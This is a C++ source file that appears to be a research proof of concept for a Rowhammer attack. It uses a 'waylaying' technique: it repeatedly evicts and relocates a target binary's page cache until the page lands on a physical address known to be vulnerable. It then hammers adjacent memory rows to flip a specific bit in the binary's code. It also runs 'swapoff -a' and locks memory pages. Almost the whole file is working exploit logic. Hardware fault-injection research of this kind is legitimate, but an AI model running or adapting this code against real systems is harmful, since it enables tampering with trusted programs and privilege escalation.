#include "iostream"
#include "sstream"
#include "string"
#include "cstdlib"
#include "vector"
#include "set"
#include "map"
#include "libhammer.h"

using namespace std;

const string green="\033[0;32m", blue="\033[1;34m", red="\033[1;31m", yellow="\033[0;33m", restore="\033[0m";

vector<HammerResult> hrs;
HammerResult victim_hr;
BinaryInfo target;
int page_offset;

vector<Page> alloc_pool()
{
    uint64_t avail_size, pool_size;
    vector<Page> pool;

    avail_size = get_available_mem();
    pool_size = (uint64_t)(avail_size * 0.9);
    pool_size -= pool_size % PAGE_SIZE;
    cout << blue << dec << "- Available mem: " << to_mb(avail_size) << "M, pool size: " << to_mb(pool_size) << "M." << endl;

    pool = allocate_mb(to_mb(pool_size));
    return pool;
}

void hold_binary(const string &path)
{
    int fd;
    unsigned sz;
    struct stat st;
    void *image;

    ASSERT(-1 != (fd = open(path.c_str(), O_RDONLY)) );
    fstat(fd, &st);
    sz = st.st_size;

    ASSERT(0 != (image = mmap(0, sz, PROT_READ, MAP_PRIVATE, fd, 0)) );
    //mlock(image, sz);
}

void waylaying_step()
{
    map<uint64_t, HammerResult> paset;
    set<uint64_t> waylaying_set;
    int uniq = 0, cnt = 0, step = 0;
    uint64_t min_pa, max_pa, waylaying_offset, current_pa;
    struct myclock myclk;

    waylaying_offset = target.offset & ~0xfffull;

    // 2. waylaying
    for (HammerResult r : hrs)
         paset[r.base] = r;

    // file+waylaying_offset should be on pa=HammerResult.base
    current_pa = get_binary_pa(target.path, waylaying_offset);
    min_pa = max_pa = current_pa;
    cout << "* current_pa = " << hex << current_pa << endl;
    //exit(0);
    START_CLOCK(myclk, CLOCK_MONOTONIC);
    while (paset.count(current_pa) == 0)
    {
        ++step;
        relocate_fadvise(target.path);
        current_pa = get_binary_pa(target.path, waylaying_offset);
        if (current_pa < min_pa) min_pa = current_pa;
        if (current_pa > max_pa) max_pa = current_pa;
        END_CLOCK(myclk);
        waylaying_set.insert(current_pa);
        cout << "+ step " << dec << step << ": " << hex << current_pa
             << dec << " coverage: " << uniq*4 << "k / " << (max_pa - min_pa)/1024 << " k, uptime: "
             << (myclk.t1.tv_sec - myclk.t0.tv_sec) << "s." << endl;

        if (waylaying_set.size() == uniq)
            ++cnt;
        else cnt=0;
        if (cnt > 10)
        {
            cout << "* waylaying...";
            waylaying();
            cnt=0;
        }

        uniq = waylaying_set.size();
    }
    victim_hr = paset[current_pa];
    cout << green << "* Success: target pa=0x" << hex << current_pa << ", hammer template="; victim_hr.print();

    cout << "- Hold the target..." << endl;
    hold_binary(target.path);
    END_CLOCK(myclk);

    cout << green << "- Waylaying complete. Time: " << dec << (myclk.t1.tv_sec - myclk.t0.tv_sec) << "s." << endl;
}

int main(int argc, char **argv)
{

    uint64_t target_pa, i, tmp=0;
    stringstream ss; ss.clear();
    vector<Page> hold_pages;

    // target info
    target.path = "./target";
    target.flip_to = 0;
    target.offset = 0xfaf0;
    target.orig = 0x5f;
    target.target = 0x5b;
    page_offset = 0xaf0;

    // 1. load templates
    load_hammer_result("hammer_result.csv");

    // 2. turn off swap
    system("swapoff -a");

    // 3. check availability, hold hammer pages
    // - The HammerResult should have only 1 flips in the whole Page/Row
    // - Test hammering on the pages, it should flip at the desired bit
    {
        vector<Page> pool = alloc_pool();
        addrmap.add(pool);
        for (HammerResult h : result_pool[target.offset & 0xfff])
            if (h.flips_page == 1 && h.flips_row == 1)
            {
                if (addrmap.has_pa(h.p) && addrmap.has_pa(h.q) && addrmap.has_pa(h.base))
                {
                    cout << green << "- Template: "; h.print(); cout << restore;
                    hrs.push_back(h);
                }
                else
                {
                    cout << yellow << "- Not available: "; h.print();
                }
            }
        for (Page pg : pool)
        {
            for (HammerResult h : hrs)
                if (pg.p == h.p || pg.p == h.q)
                {
                    hold_pages.push_back(pg);
                    pg.lock();
                    cout << green << "- Hold page: 0x" << hex << pg.p << endl;
                }
                else pg.reset();
        }
        addrmap.clear();
    }

    if (hrs.empty())
    {
        cout << yellow << "* No victim page available, Exit..." << endl;
    }
    else
    {
        addrmap.add(hold_pages);
        addrmap.add_pagemap(hold_pages);
        // 4. waylaying
        //exit(0);
        cout << blue << "* Wait 5s to start waylaying..." << restore << endl;
        usleep(5000000);
        waylaying_step();
        // 5. attack
        cout << green << "- Check original program..." << restore << endl;
        system("./target");
        cout << blue << "* Hammering 1000000 times on 0x" << hex << addrmap.page_map[victim_hr.p].p << " and 0x" << addrmap.page_map[victim_hr.q].p << endl;
        hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 1000000, 0);
        //hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 3000000, 0);
        //hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 3000000, 0);
        cout << green << "- Check result" << endl;
        system("./target");
    }

    // 6. cleanup
    cout << green << "- cleanup..." << endl;
    for (Page pg : hold_pages) pg.reset();

    return 0;
}
